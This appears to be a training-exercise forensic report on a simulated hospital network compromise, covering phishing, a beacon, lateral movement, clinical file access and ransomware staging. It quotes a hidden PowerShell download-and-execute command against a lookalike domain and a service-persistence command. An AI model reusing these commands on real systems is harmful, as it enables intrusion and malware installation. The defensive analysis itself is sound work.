
# Forensic Findings: IR-2026-0420-01

**Organization:** MedDefense Health Systems  
**Incident ID:** IR-2026-0420-01  
**Severity:** SEV1 — Critical  
**Incident date:** 2026-04-20  
**Analyst:** Nishat Sultana Supty
**Analysis environment:** Kali Linux  
**Classification:** Confidential — Incident Response  
**Report status:** Preliminary — Sample-log analysis completed; full forensic artifacts pending

---

## 1. Executive Summary

This investigation reconstructs the available evidence of a multi-host compromise affecting MedDefense Health Systems between 17 and 20 April 2026.

The provided sample logs support the following sequence:

1. The account `MEDDEFENSE\jdoe` accessed Outlook and downloaded a macro-enabled Word document named `Invoice_Q4_2025.docm`.
2. Microsoft Word launched a hidden PowerShell downloader that retrieved a script from a suspicious lookalike domain.
3. PowerShell created and launched an unsigned executable named `svchost32.exe`.
4. The executable established communication with known Cobalt Strike infrastructure at `45.152.66.114:443`.
5. The executable accessed the LSASS process, raising concerns about credential access.
6. Similar malicious activity appeared on three additional workstations.
7. The same account was associated with unauthorized access to clinical PDF documents on FILE-SVR-01.
8. Proxy logs show suspicious outbound communication from FILE-SVR-01, including a large recorded transfer.
9. Ransomware staging scripts were created on four workstations on 20 April.
10. C2 communication from CS-WS-101 was still recorded at 19:32:04Z on 20 April.

The supplied evidence strongly supports malware execution, C2 communication, suspicious remote access and ransomware preparation.

However, the following remain unverified:

- Memory-resident code injection.
- Recovered NTLM hashes.
- Original malicious document and payload contents.
- Exact lateral movement mechanism across all hosts.
- Actual patient-data exfiltration.
- Ransomware execution.
- Complete scope of affected accounts.

The original memory image, disk image and full investigation logs were not supplied.

---

## 2. Scope, Evidence and Methodology

### 2.1 Evidence Inventory

| ID | Required artifact | Available material | Status |
|---|---|---|---|
| ART-001 | `cs-ws-101.mem` | Not provided | Pending |
| ART-002 | `cs-ws-101.dd` | Not provided | Pending |
| ART-003 | `proxy_72h.jsonl` | `proxy_72h.sample.jsonl` | Sample reviewed |
| ART-004 | `sysmon_multihost.jsonl` | `sysmon_multihost.sample.jsonl` | Sample reviewed |
| ART-005 | `fileserver_access.evtx` | `fileserver_access.sample.json` | Condensed export reviewed |

The sample files demonstrate the evidence structure and contain relevant event examples. However, the assignment requires conclusions to be established using the full investigation artifacts.

Accordingly, sample-derived conclusions are preliminary and require validation against the original artifacts.

### 2.2 Evidence Verification

The following SHA-256 hashes were previously calculated using Kali Linux:

| Artifact | SHA-256 |
|---|---|
| `proxy_72h.sample.jsonl` | `1c82b57868333bdc40516c20fed99e24e41dd3fbb052e8cd27b67f34dd208e3a` |
| `sysmon_multihost.sample.jsonl` | `0fc34f78e86a403e9e262cad7b621713a464eae18d1bb70d5f743a7f32e49099` |
| `fileserver_access.sample.json` | `dc184b375e6c3b1b76f9c9f8959a00ed7c0e0c4092c5d9f45c66ba8e2b538b7a` |

**Verification command:**

```bash
sha256sum proxy_72h.sample.jsonl \
  sysmon_multihost.sample.jsonl \
  fileserver_access.sample.json
```

**Baseline comparison:** Not independently verified against original artifact baselines.

**Chain-of-custody update:** Not confirmed.

**Integrity limitation:** These hashes establish reference values for the sample files analyzed. They do not establish integrity of the original full forensic artifacts.

### 2.3 Analysis Tools

- Kali Linux
- `jq` — JSON/JSONL filtering
- `grep` — text searching
- `sha256sum` — integrity checking
- Volatility 3 — planned memory analysis
- The Sleuth Kit — planned disk analysis
- `evtx_dump` — planned full Windows event-log extraction

All timestamps in this report are UTC.

### 2.4 Certainty Definitions

**Confirmed:** Directly supported by the supplied records, subject to validation against original evidence.

**Probable:** Strongly supported by multiple related indicators, but an essential part of the mechanism or outcome remains unverified.

**Possible:** Plausible interpretation requiring additional forensic evidence.

The certainty labels describe the interpretation of the available sample records, not independent verification of the original artifacts.

---

# 3. Memory Analysis — ART-001

**Required artifact:** `cs-ws-101.mem`  
**Tool:** Volatility 3  
**Status:** Not analyzed — memory image unavailable.

The incident context indicates that a memory capture was reportedly performed on CS-WS-101. However, the actual image was not supplied for examination.

## MEM-001 — Beacon Process and Parent Process

**Required command:**

```bash
vol -f cs-ws-101.mem windows.pstree.PsTree
```

**Observed Volatility output:** Not available.

**Related sample Sysmon evidence:**

```text
WINWORD.EXE
PID: 4921

powershell.exe
PID: 6201
PPID: 4921

svchost32.exe
PID: 7318
PPID: 6201
```

**Conclusion:**

The sample Sysmon records describe a process chain in which Microsoft Word launched PowerShell, which subsequently launched the suspicious executable.

This process relationship is supported by Sysmon records but has not been independently verified using memory analysis.

**ATT&CK:**
- T1204.002 — User Execution: Malicious File
- T1059.001 — Command and Scripting Interpreter: PowerShell
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location

**Certainty:** Confirmed in sample Sysmon records; memory confirmation pending.

## MEM-002 — PowerShell Downloader Command

**Required command:**

```bash
vol -f cs-ws-101.mem windows.cmdline.CmdLine
```

**Observed Volatility output:** Not available.

**Related Sysmon command line:**

```text
powershell.exe -NoProfile -WindowStyle Hidden -ep bypass
-c "IEX(New-Object Net.WebClient).DownloadString(
'https://staging.office365-cdn.net/updates/inv_payload.ps1')"
```

**Conclusion:**

The command uses PowerShell to download and execute remote script content while suppressing the visible window and bypassing the process-level execution policy.

This is consistent with a malicious downloader.

**ATT&CK:**
- T1059.001 — PowerShell
- T1105 — Ingress Tool Transfer

**Certainty:** Confirmed in sample Sysmon records; memory confirmation pending.

## MEM-003 — Active C2 Connection

**Required command:**

```bash
vol -f cs-ws-101.mem windows.netscan.NetScan
```

**Observed Volatility output:** Not available.

**Related sample network event:**

```text
2026-04-20T19:32:04Z
Host: CS-WS-101
Process: svchost32.exe
Destination: 45.152.66.114:443
```

**Conclusion:**

Sysmon and proxy samples record C2-related communication shortly before the reported 19:38Z memory capture.

However, an active socket at the exact time of capture cannot be confirmed without examining the memory image.

**ATT&CK:** T1071.001 — Application Layer Protocol: Web Protocols

**Certainty:** Confirmed historical connection in samples; active connection at capture time possible.

## MEM-004 — Suspicious Injected Memory Regions

**Required command:**

```bash
vol -f cs-ws-101.mem windows.malfind.Malfind
```

**Observed output:** Not available.

**Conclusion:**

Memory injection cannot be confirmed from the provided logs alone.

Suspicious executable-memory regions, their permissions and their contents must be examined before assigning an injection technique.

**ATT&CK:** T1055 — Process Injection (investigative hypothesis only)

**Certainty:** Possible; not demonstrated.

## MEM-005 — Credential Material in Memory

**Required command:**

```bash
vol -f cs-ws-101.mem windows.hashdump.Hashdump
```

**Observed output:** Not available.

**Related Sysmon event:**

```text
2026-04-17T14:25:02Z
Source: svchost32.exe
Target: lsass.exe
Granted access: 0x1010
```

**Conclusion:**

The suspicious executable accessed LSASS, which is consistent with potential credential-access activity.

However, this event alone does not prove credential dumping or establish that NTLM hashes were recovered.

The requested hashdump plugin may also require memory-resident registry structures that are unavailable or unsuitable in the supplied image.

**ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

**Certainty:** Confirmed process-access event in sample; credential dumping possible.

---

# 4. Disk Analysis — ART-002

**Required artifact:** `cs-ws-101.dd`  
**Tool:** The Sleuth Kit  
**Status:** Not analyzed — disk image unavailable.

## DISK-001 — Partition Layout and Filesystem

**Required commands:**

```bash
mmls cs-ws-101.dd
```

```bash
fsstat -o <START_SECTOR> cs-ws-101.dd
```

`<START_SECTOR>` must be replaced with the actual partition offset identified by `mmls`.

**Observed output:** Not available.

**Conclusion:** Disk partition structure and filesystem metadata remain unverified.

**ATT&CK:** Not applicable — forensic acquisition and filesystem analysis.

**Certainty:** Not assessed.

## DISK-002 — Suspicious File Timeline

**Required commands:**

```bash
fls -r -m C: -o <START_SECTOR> cs-ws-101.dd > bodyfile.txt
```

```bash
mactime -b bodyfile.txt -d > disk_timeline.csv
```

```bash
grep -iE 'AppData|Temp|Windows/Tasks|\.docm|\.ps1|\.dll' \
  disk_timeline.csv
```

**Observed output:** Not available.

**Conclusion:**

The original disk timeline is required to determine file creation, modification and access activity in suspicious directories.

**ATT&CK:** Not assigned until suspicious disk activity is verified.

**Certainty:** Not assessed.

## DISK-003 — Malicious Word Document

**Target file:** `Invoice_Q4_2025.docm`

**Related sample evidence:**

```text
2026-04-17T14:18:02Z
Downloaded: Invoice_Q4_2025.docm
MIME: Macro-enabled Word document
```

**Required extraction command:**

```bash
icat -o <START_SECTOR> cs-ws-101.dd <FILE_INODE> \
  > Invoice_Q4_2025.docm
```

```bash
sha256sum Invoice_Q4_2025.docm
```

**Observed disk output:** Not available.

**Conclusion:**

The sample logs show that a macro-enabled Word document was downloaded and later opened.

The original document has not been extracted or inspected for malicious macro code.

**ATT&CK:**
- T1566.001 — Phishing: Spearphishing Attachment
- T1204.002 — User Execution: Malicious File

**Certainty:** Confirmed document download in sample; phishing delivery probable; macro contents unverified.

## DISK-004 — PowerShell Downloader

**Target:** `inv_payload.ps1`

**Related evidence:**

```text
2026-04-17T14:22:14Z
PowerShell executed a DownloadString command.

2026-04-17T14:22:19Z
Proxy recorded a request for inv_payload.ps1.
```

**Required extraction:**

```bash
icat -o <START_SECTOR> cs-ws-101.dd <FILE_INODE> \
  > inv_payload.ps1
```

```bash
sha256sum inv_payload.ps1
```

**Observed disk output:** Not available.

**Conclusion:**

The sample logs support remote PowerShell script retrieval and execution.

A local script file may not exist because the command executes downloaded content directly in memory.

The actual script contents and file hash remain unavailable.

**ATT&CK:**
- T1059.001 — PowerShell
- T1105 — Ingress Tool Transfer

**Certainty:** Confirmed downloader command in sample; payload contents unverified.

## DISK-005 — Beacon Payload

**Related executable:**

```text
C:\ProgramData\Microsoft\svchost32.exe
```

**Sample Sysmon hash:**

```text
ff4c8a2d9e7b1a3c5d8f2e6b4a1d9c7f3e0b8a6d2c9e1f5a7b3d8c4e6f2a9b1d
```

This is a hash value reported by the sample Sysmon event, not an independently calculated hash of an extracted file.

**Required extraction and verification:**

```bash
icat -o <START_SECTOR> cs-ws-101.dd <FILE_INODE> \
  > svchost32.exe
```

```bash
sha256sum svchost32.exe
```

**Conclusion:**

The sample records show an unsigned suspicious executable created by PowerShell and associated with C2 activity.

A separate beacon DLL was not identified in the supplied samples. Its existence, location and hash remain unverified.

**ATT&CK:**
- T1036.005 — Masquerading
- T1105 — Ingress Tool Transfer

**Certainty:** Confirmed executable activity in sample; beacon DLL not verified.

---

# 5. Proxy Log Analysis — ART-003

**Sample artifact:** `proxy_72h.sample.jsonl`

The commands below are reproducible against the provided sample. Results require confirmation against `proxy_72h.jsonl`.

## PROXY-001 — Initial Phishing Attachment Download

**Command:**

```bash
jq -r '
select(.download == true)
| [.ts, .host, .user, .filename, .url]
| @tsv
' proxy_72h.sample.jsonl
```

**Relevant output:**

```text
2026-04-17T14:18:02Z
CS-WS-101
MEDDEFENSE\jdoe
Invoice_Q4_2025.docm
https://outlook.office.com/mail/download?id=AAMkAG-Invoice
```

**Conclusion:**

The user downloaded a macro-enabled Word document from an Outlook attachment URL.

The subsequent malicious execution chain strongly suggests that the document was used as the initial access mechanism.

**ATT&CK:**
- T1566.001 — Spearphishing Attachment
- T1204.002 — User Execution: Malicious File

**Certainty:** Confirmed download in sample; malicious phishing delivery probable.

## PROXY-002 — First C2 Connection

**Command:**

```bash
jq -r '
select(.dst_ip == "45.152.66.114")
| [.ts, .host, .dst_ip, .url, .status]
| @tsv
' proxy_72h.sample.jsonl
```

**Relevant output:**

```text
2026-04-17T14:23:07Z
CS-WS-101
45.152.66.114
staging.office365-cdn.net:443
200
```

**Conclusion:**

The proxy sample records a successful HTTP CONNECT request to the known Cobalt Strike destination.

A separate Sysmon event records the suspicious executable connecting to the same destination at 14:24:02Z.

**ATT&CK:** T1071.001 — Web Protocols

**Certainty:** Confirmed in sample records.

## PROXY-003 — Beacon Timing Pattern

**Command:**

```bash
jq -r '
select(.beacon_pattern != null)
| [.ts, .host, .beacon_pattern, .jitter_ms]
| @tsv
' proxy_72h.sample.jsonl
```

**Relevant output:**

```text
2026-04-17T14:25:31Z
CS-WS-101
sleep_60s_jitter_10pct
64000

2026-04-18T02:14:22Z
CS-WS-101
sleep_60s_jitter_10pct
```

**Conclusion:**

The records label the traffic as beaconing with an approximately 60-second sleep interval and 10% jitter.

The condensed sample does not contain enough consecutive connections to independently calculate and verify the full beacon frequency.

**ATT&CK:** T1071.001 — Web Protocols

**Certainty:** Confirmed reported beacon configuration in sample; measured frequency unverified.

## PROXY-004 — Possible Data Exfiltration

**Command:**

```bash
jq -r '
select(.dst_ip == "45.152.66.114")
| select(.bytes > 100000)
| [.ts, .host, .bytes, .url, .note]
| @tsv
' proxy_72h.sample.jsonl
```

**Relevant output:**

```text
2026-04-19T02:14:22Z
FILE-SVR-01
2400412
staging.office365-cdn.net:443
large_egress_payload
```

**Conclusion:**

The file server had a large recorded connection to the C2 destination during the same period as unauthorized clinical file access.

This correlation raises a significant possibility of data exfiltration.

However, the proxy sample does not define whether the `bytes` field represents uploaded, downloaded or total transferred data.

The event therefore does not independently prove that patient files left the network.

**ATT&CK:** T1041 — Exfiltration Over C2 Channel

**Certainty:** Possible.

## PROXY-005 — C2 Activity Across Multiple Hosts

**Command:**

```bash
jq -r '
select(.dst_ip == "45.152.66.114")
| [.host, .ts]
| @tsv
' proxy_72h.sample.jsonl
```

**Relevant output:**

```text
CS-WS-101    2026-04-17T14:23:07Z
CS-WS-104    2026-04-19T00:04:17Z
CS-WS-107    2026-04-19T00:12:44Z
CS-WS-112    2026-04-19T00:18:02Z
FILE-SVR-01  2026-04-19T02:14:04Z
```

**Conclusion:**

The same suspicious C2 destination appears in records from four workstations and the file server.

This supports a multi-host compromise.

It does not prove the file server had an active beacon at incident declaration time.

**ATT&CK:** T1071.001 — Web Protocols

**Certainty:** Confirmed historical connections in sample.

---

# 6. Sysmon Analysis — ART-004

**Sample artifact:** `sysmon_multihost.sample.jsonl`

## SYS-001 — Malicious Process Execution Chain

**Command:**

```bash
jq -r '
select(.host == "CS-WS-101")
| select(.event_type == "process_create")
| [.ts, .image, .pid, .ppid, .parent_image, .cmdline]
| @tsv
' sysmon_multihost.sample.jsonl
```

**Relevant output:**

```text
14:17:52Z WINWORD.EXE
PID 4921

14:22:14Z powershell.exe
PID 6201, PPID 4921

14:23:14Z svchost32.exe
PID 7318, PPID 6201
```

**Conclusion:**

The process relationships establish a suspicious chain from Microsoft Word to PowerShell to an unsigned executable in ProgramData.

The executable name resembles a legitimate Windows component but is not located in the standard Windows system directory.

**ATT&CK:**
- T1204.002 — Malicious File
- T1059.001 — PowerShell
- T1036.005 — Masquerading

**Certainty:** Confirmed in sample.

## SYS-002 — Possible Credential Access

**Command:**

```bash
jq -r '
select(.event_type == "process_access")
| [.ts, .host, .source_image, .target_image, .granted_access]
| @tsv
' sysmon_multihost.sample.jsonl
```

**Relevant output:**

```text
2026-04-17T14:25:02Z
CS-WS-101
svchost32.exe
lsass.exe
0x1010
```

**Conclusion:**

The suspicious executable opened a handle to LSASS.

This is consistent with possible credential collection, but no memory dump, recovered hash or completed credential-theft operation has been verified.

**ATT&CK:** T1003.001 — LSASS Memory

**Certainty:** Confirmed process access; credential dumping possible.

## SYS-003 — Lateral Movement and Service Installation

**Command:**

```bash
jq -r '
select(.host == "CS-WS-104")
| select(.event_type == "process_create")
| [.ts, .user, .image, .parent_image, .cmdline, .logon_type]
| @tsv
' sysmon_multihost.sample.jsonl
```

**Relevant output:**

```text
2026-04-19T00:03:44Z
MEDDEFENSE\jdoe
cmd.exe
Parent: services.exe

sc create WinHealthSvc
binPath= C:\ProgramData\Microsoft\svchost32.exe
start= auto

Logon type: 3
```

**Conclusion:**

The sample records show a service-creation command on CS-WS-104 associated with a network logon context.

This is consistent with remote service-based lateral movement.

However, the provided samples do not include sufficient authentication events to prove NTLM hash reuse or pass-the-hash activity across CS-WS-104, CS-WS-107 and CS-WS-112.

**ATT&CK:**
- T1021.002 — SMB/Windows Admin Shares (possible mechanism)
- T1543.003 — Windows Service
- T1569.002 — Service Execution (possible mechanism)

**Certainty:** Confirmed service-creation command in sample; exact lateral movement method probable/possible.

## SYS-004 — Persistence Through Windows Service Configuration

**Command:**

```bash
jq -r '
select(.event_type == "registry_set")
| [.ts, .host, .target_object, .details]
| @tsv
' sysmon_multihost.sample.jsonl
```

**Relevant output:**

```text
2026-04-17T14:23:28Z
CS-WS-101

HKLM\SYSTEM\CurrentControlSet\Services\WinHealthSvc\ImagePath

C:\ProgramData\Microsoft\svchost32.exe
```

**Conclusion:**

A Windows service registry value was configured to launch the suspicious executable.

This supports service-based persistence.

**ATT&CK:** T1543.003 — Create or Modify System Process: Windows Service

**Certainty:** Confirmed registry modification in sample.

## SYS-005 — Ransomware Staging

**Command:**

```bash
jq -r '
select(.event_type == "file_create")
| select(.target? | strings | contains("encryption_staging.ps1"))
| [.ts, .host, .image, .target]
| @tsv
' sysmon_multihost.sample.jsonl
```

**Relevant output:**

```text
2026-04-20T14:23:18Z CS-WS-101
2026-04-20T14:25:02Z CS-WS-104
2026-04-20T14:25:42Z CS-WS-107
2026-04-20T14:26:14Z CS-WS-112
```

**Created file:**

```text
C:\Windows\System32\encryption_staging.ps1
```

**Creating process:**

```text
C:\ProgramData\Microsoft\svchost32.exe
```

**Conclusion:**

The suspicious executable created the same PowerShell staging script on four workstations within approximately three minutes.

This strongly supports coordinated ransomware preparation.

The samples do not demonstrate execution of the scripts or successful file encryption.

**ATT&CK:**
- T1105 — Ingress Tool Transfer (possible staging mechanism)
- T1486 — Data Encrypted for Impact (intended activity only; not observed)

**Certainty:** Confirmed script creation; ransomware execution not confirmed.

## SYS-006 — Additional Server Activity

**Command:**

```bash
jq -r '
select(.host == "SCHED-SVR-01" or .host == "FILE-SVR-01")
| [.ts, .host, .event_type, .image, .user]
| @tsv
' sysmon_multihost.sample.jsonl
```

**Relevant output:**

```text
2026-04-19T02:14:01Z
FILE-SVR-01
process_create
svchost32.exe

2026-04-20T18:02:18Z
SCHED-SVR-01
process_create
svchost32.exe
```

**Conclusion:**

The suspicious executable also appeared on FILE-SVR-01 and SCHED-SVR-01.

SCHED-SVR-01 should be included in the expanded investigation scope, even though the original containment plan identified five primary assets.

**ATT&CK:** T1036.005 — Masquerading

**Certainty:** Confirmed suspicious process records in sample; complete server compromise scope unverified.

---

# 7. File Server Analysis — ART-005

**Sample artifact:** `fileserver_access.sample.json`

The sample is a condensed export referencing a full EVTX file containing 1,847 Event ID 4663 records.

## FS-001 — Patient File Access Window

**Command:**

```bash
jq '.window, .access_summary' fileserver_access.sample.json
```

**Relevant output:**

```text
Start: 2026-04-19T02:14:01Z
End:   2026-04-19T02:41:12Z

Event ID: 4663
Total access events: 1847
User: MEDDEFENSE\jdoe
Access: ReadData
```

**Conclusion:**

The sample summary reports 1,847 clinical PDF file-access events within approximately 27 minutes.

These are object-access events, not independently verified unique files or patients.

**ATT&CK:** T1005 — Data from Local System

**Certainty:** Confirmed in sample summary; full count requires EVTX validation.

## FS-002 — Clinical File Categories

**Command:**

```bash
jq -r '
.representative_events[]
| [.ts, .object_name, .process_name]
| @tsv
' fileserver_access.sample.json
```

**Relevant output:**

```text
D:\clinical\labs\2026-04-18_panel_001.pdf
D:\clinical\labs\2026-04-18_panel_002.pdf
D:\clinical\notes\progress_2026-04-17_ER_admit_00441.pdf
D:\clinical\labs\2026-04-15_panel_1102.pdf
D:\clinical\notes\progress_2026-04-18_floor_4_00221.pdf
```

**Reported file-type summary:**

```text
.pdf  = 1847
.docx = 0
.xlsx = 0
```

**Conclusion:**

The accessed material included clinical laboratory reports and patient progress notes.

The sample establishes the categories but does not provide enough records to calculate exact totals for each directory or each minute.

**ATT&CK:** T1005 — Data from Local System

**Certainty:** Confirmed categories in sample; detailed distribution unverified.

## FS-003 — Account Authentication

**Command:**

```bash
jq -r '
.supporting_events[]
| [.ts, .event_id, .user, .logon_type, .src_ip, .auth_package, .logon_id]
| @tsv
' fileserver_access.sample.json
```

**Relevant output:**

```text
2026-04-19T02:14:00.842Z
Event ID: 4624
User: MEDDEFENSE\jdoe
Source: 10.30.12.101
Authentication: Kerberos
Logon type: 3
Logon ID: 0xAF12C4B8

2026-04-19T02:41:18.004Z
Event ID: 4634
Session terminated
```

**Conclusion:**

The sample shows a network logon from CS-WS-101 to FILE-SVR-01 using `MEDDEFENSE\jdoe`.

The same logon ID is associated with the clinical file-access events.

The supplied analyst note states that the account belongs to a scheduling coordinator without a legitimate need for these clinical documents.

This strongly supports unauthorized account use.

**ATT&CK:**
- T1078 — Valid Accounts
- T1021.002 — SMB/Windows Admin Shares (possible remote access mechanism)

**Certainty:** Confirmed authentication and access association in sample; exact remote protocol and credential-theft mechanism unverified.

## FS-004 — Correlation With Suspicious Outbound Traffic

**Commands:**

```bash
jq -r '
select(.host == "FILE-SVR-01")
| [.ts, .dst_ip, .bytes, .note]
| @tsv
' proxy_72h.sample.jsonl
```

```bash
jq '.window' fileserver_access.sample.json
```

**Relevant output:**

```text
02:14:01Z  Clinical file-access window begins
02:14:04Z  FILE-SVR-01 C2-related connection
02:14:22Z  Large recorded transfer: 2,400,412 bytes
02:41:09Z  Additional C2-related connection
02:41:12Z  Clinical file-access window ends
```

**Conclusion:**

The overlap between unauthorized file reads and suspicious C2-related traffic creates a credible exfiltration concern.

However, the direction and content of the transferred data have not been established.

**ATT&CK:** T1041 — Exfiltration Over C2 Channel

**Certainty:** Possible.

---

# 8. Attack Chain Summary

| Stage | Time range (UTC) | ATT&CK technique | Affected hosts | Evidence | Certainty |
|---|---|---|---|---|---|
| Email attachment download | Apr 17, 14:18:02 | T1566.001, T1204.002 | CS-WS-101 | PROXY-001 | Probable phishing |
| Malicious document opened | Apr 17, 14:17:52 | T1204.002 | CS-WS-101 | SYS-001 | Confirmed sample event |
| PowerShell downloader | Apr 17, 14:22:14–14:22:19 | T1059.001, T1105 | CS-WS-101 | MEM-002, DISK-004, SYS-001 | Confirmed sample event |
| Malicious executable created and launched | Apr 17, 14:23:02–14:23:14 | T1036.005, T1105 | CS-WS-101 | SYS-001, DISK-005 | Confirmed sample event |
| Service persistence | Apr 17, 14:23:28 | T1543.003 | CS-WS-101 | SYS-004 | Confirmed sample event |
| C2 communication | Apr 17, 14:23:07–Apr 20, 19:32:04 | T1071.001 | CS-WS-101 | PROXY-002, MEM-003 | Confirmed historical events |
| Possible credential access | Apr 17, 14:25:02 | T1003.001 | CS-WS-101 | SYS-002, MEM-005 | Possible dumping |
| Suspected keylogging artifact | Apr 18, 09:41:14 | T1056.001 | CS-WS-101 | Sysmon file-create event | Possible |
| Lateral movement / service deployment | Apr 19, 00:03:44–00:18:02 | T1543.003, T1021.002 | WS-104, WS-107, WS-112 | SYS-003, PROXY-005 | Probable |
| File-server remote logon | Apr 19, 02:14:00 | T1078 | CS-WS-101, FILE-SVR-01 | FS-003 | Confirmed sample event |
| Clinical file access | Apr 19, 02:14:01–02:41:12 | T1005 | FILE-SVR-01 | FS-001, FS-002 | Confirmed sample summary |
| Possible exfiltration | Apr 19, 02:14:22 | T1041 | FILE-SVR-01 | PROXY-004, FS-004 | Possible |
| Ransomware staging | Apr 20, 14:23:18–14:26:14 | T1105; T1486 intended | Four workstations | SYS-005 | Confirmed staging |
| Additional server activity | Apr 20, 18:02:18 | T1036.005 | SCHED-SVR-01 | SYS-006 | Confirmed sample event |
| Latest observed C2 connection | Apr 20, 19:32:04 | T1071.001 | CS-WS-101 | PROXY-002, MEM-003 | Confirmed historical event |

**Timeline note:** The sample Sysmon record places Word execution at 14:17:52Z, ten seconds before the proxy records the attachment download at 14:18:02Z. This discrepancy requires verification against original timestamps, event ordering and clock synchronization. The download cannot be assumed to have preceded the recorded Word launch.

---

# 9. Indicators of Compromise

| Type | Indicator | Description |
|---|---|---|
| IP | `45.152.66.114` | Known suspicious C2 destination |
| Domain | `staging.office365-cdn.net` | Downloader and C2-related domain |
| URL | `https://staging.office365-cdn.net/updates/inv_payload.ps1` | PowerShell downloader URL |
| File | `Invoice_Q4_2025.docm` | Suspicious macro-enabled Word attachment |
| Executable | `C:\ProgramData\Microsoft\svchost32.exe` | Suspicious unsigned executable |
| Service | `WinHealthSvc` | Suspicious Windows service |
| Script | `C:\Windows\System32\encryption_staging.ps1` | Ransomware staging script |
| File | `C:\Windows\Temp\klog.tmp` | Possible keylogging-related artifact |
| Account | `MEDDEFENSE\jdoe` | Account associated with suspicious activity |
| Logon ID | `0xAF12C4B8` | File-server authentication session |

These indicators should be used for investigation and defensive detection. The original binary contents and complete infrastructure relationships remain unverified.

---

# 10. Investigation Limitations

1. The original memory image was not supplied, so Volatility 3 findings cannot be confirmed.
2. The original disk image was not supplied, so partition metadata, MAC timestamps and extracted malware hashes are unavailable.
3. The full proxy and Sysmon files were not supplied; only condensed samples were analyzed.
4. The full Windows EVTX was not supplied, preventing independent validation and detailed grouping of all 1,847 events.
5. The exact NTLM authentication and lateral movement mechanism remains unverified.
6. LSASS access does not prove successful credential dumping.
7. The large proxy transfer does not prove exfiltration of patient data.
8. No evidence confirms ransomware script execution or successful encryption.
9. The original Word document's macro contents were not examined.
10. The process creation and attachment download timestamps contain an ordering discrepancy.
11. No verified original-artifact baseline hashes or completed chain-of-custody updates were supplied.
12. The samples identify suspicious activity on SCHED-SVR-01, requiring expanded scoping.

---

# 11. Final Forensic Conclusion

The supplied sample evidence describes a multi-stage compromise beginning with a suspicious macro-enabled Word document on CS-WS-101.

The attack progressed through PowerShell execution, deployment of a masquerading executable, Windows service persistence and communication with known Cobalt Strike infrastructure.

Subsequent records show similar C2 activity on three additional workstations and suspicious activity on FILE-SVR-01.

The `MEDDEFENSE\jdoe` account was associated with a remote Kerberos logon to FILE-SVR-01 and a reported 1,847 clinical PDF file-access events within approximately 27 minutes.

The file-access window overlaps with suspicious outbound traffic, creating a significant but unconfirmed data-exfiltration concern.

On 20 April, ransomware staging scripts were created on four workstations. No supplied evidence establishes that those scripts executed.

The latest recorded C2 connection from CS-WS-101 occurred at 19:32:04Z, shortly before the reported memory capture.

The incident should be treated as a serious multi-host compromise with potential credential exposure, sensitive clinical data access and ransomware risk.

**Overall conclusion:** The sample logs provide a coherent preliminary reconstruction, but final forensic confirmation requires the original memory, disk, proxy, Sysmon and EVTX artifacts.

**Report status:** Preliminary forensic findings completed; original-artifact analysis pending.
